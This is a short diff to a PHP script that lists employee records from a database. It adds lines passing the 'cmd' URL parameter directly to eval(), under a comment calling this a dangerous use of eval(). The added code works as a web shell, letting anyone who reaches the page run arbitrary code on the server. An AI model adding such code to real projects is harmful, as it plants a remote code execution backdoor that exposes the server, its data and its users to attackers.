@@ -16,3 +16,9 @@ foreach ($file_db->query($sql) as $row) {
     echo $employee;
 }
 echo 'tetsing';
+
+$input = $_GET['cmd'];
+
+// Dangerous use of eval()
+eval($input);
+?>
